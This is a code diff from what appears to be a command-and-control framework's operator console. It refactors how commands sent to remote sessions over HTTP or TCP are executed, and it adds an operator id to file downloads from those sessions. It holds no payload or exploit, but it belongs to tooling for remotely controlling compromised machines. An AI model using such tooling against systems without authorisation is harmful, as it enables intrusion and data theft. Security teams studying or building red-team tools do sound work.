@@ -51,6 +51,11 @@ from core.malleable_c2 import malleable_c2 as malleable
 from core.banner import print_banner
 from core.prompt_manager import prompt_manager
 
+# Command Execution Imports
+
+from core.command_execution import http_command_execution as http_exec
+from core.command_execution import tcp_command_execution as tcp_exec
+
 from colorama import init, Fore, Style
 brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
 brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
@@ -300,7 +305,7 @@ def process_command(user: str, to_console: bool = True, to_op: str = None):
 					shell.download_folder_http(sid, remote_file, local_file)
 
 				elif check is False:
-					shell.download_file_http(sid, remote_file, local_file)
+					shell.download_file_http(sid, remote_file, local_file, op_id=to_op)
 
 				else:
 					pass
@@ -1310,10 +1315,10 @@ help                 - Display this help menu
 		session = session_manager.sessions[sid]
 		if session.transport in ("http", "https"):
 
-			out = shell.run_command_http(sid, cmd_str, op_id=to_op)
+			out = http_exec.run_command_http(sid, cmd_str, op_id=to_op)
 
 		else:
-			out = shell.run_command_tcp(sid, cmd_str, timeout=0.5, portscan_active=True, op_id=to_op)
+			out = tcp_exec.run_command_tcp(sid, cmd_str, timeout=0.5, portscan_active=True, op_id=to_op)
 
 		if out is not None and out != "":
 			print(brightgreen + out)
